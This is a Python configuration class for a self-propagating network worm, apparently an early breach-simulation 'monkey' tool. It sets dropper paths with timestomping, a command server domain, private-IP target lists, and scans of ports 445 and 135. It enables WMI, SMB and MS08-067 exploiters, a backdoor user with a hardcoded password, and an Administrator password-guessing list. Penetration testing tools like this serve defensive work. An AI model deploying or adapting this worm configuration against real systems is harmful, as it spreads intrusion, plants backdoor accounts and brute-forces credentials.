
import os
import sys
import ntpath
from network.range import ClassCRange, RelativeRange, FixedRange
from exploit import WmiExploiter, Ms08_067_Exploiter, SmbExploiter
from network import TcpScanner, PingScanner

__author__ = 'itamar'

class WormConfiguration(object):
    ###########################
    ### logging config
    ###########################

    use_file_logging = True
    dropper_log_path =  os.path.expandvars("%temp%\~df1562.tmp")
    monkey_log_path = os.path.expandvars("%temp%\~df1563.tmp")

    ###########################
    ### dropper config
    ###########################

    dropper_try_move_first = sys.argv[0].endswith(".exe")
    dropper_set_date = True
    dropper_date_reference_path = r"\windows\system32\kernel32.dll"
    dropper_target_path = ntpath.join(r"C:\Windows", ntpath.split(sys.argv[0])[-1])

    ###########################
    ### monkey config
    ###########################

    singleton_mutex_name = "{2384ec59-0df8-4ab9-918c-843740924a28}"

    # how long to wait between scan iterations
    timeout_between_iterations = 10

    # how many scan iterations to perform on each run
    max_iterations = 2

    scanner_class = TcpScanner
    exploiter_classes = WmiExploiter, SmbExploiter, Ms08_067_Exploiter

    # how many victims to look for in a single scan iteration
    victims_max_find = 14

    # how many victims to exploit before stopping
    victims_max_exploit = 7

    command_server = "russian-mail-brides.com"

    ###########################
    ### scanners config
    ###########################


    #range_class = RelativeRange
    #range_size = 8
    range_class = FixedRange
    range_fixed = ("192.168.122.15", "192.168.122.17", "192.168.122.14", "192.168.122.9",
                   "192.168.144.8", "192.168.144.11", "192.168.144.12",
                   "192.168.166.10", "192.168.166.12", "192.168.166.11")

    # TCP Scanner
    tcp_target_ports = [445, 135]
    tcp_scan_timeout = 1000 # 1000 Milliseconds
    tcp_scan_interval = 200

    # Ping Scanner
    ping_scan_timeout = 1000

    ###########################
    ### exploiters config
    ###########################

    skip_exploit_if_file_exist = True

    ms08_067_exploit_attempts = 5
    ms08_067_remote_user_add = "IUSER_SUPPORT"
    ms08_067_remote_user_pass = "Password1!"

    # psexec exploiter
    psexec_user = "Administrator"
    psexec_passwords = ["1234", "password", "Password1!", "password", "12345678"]
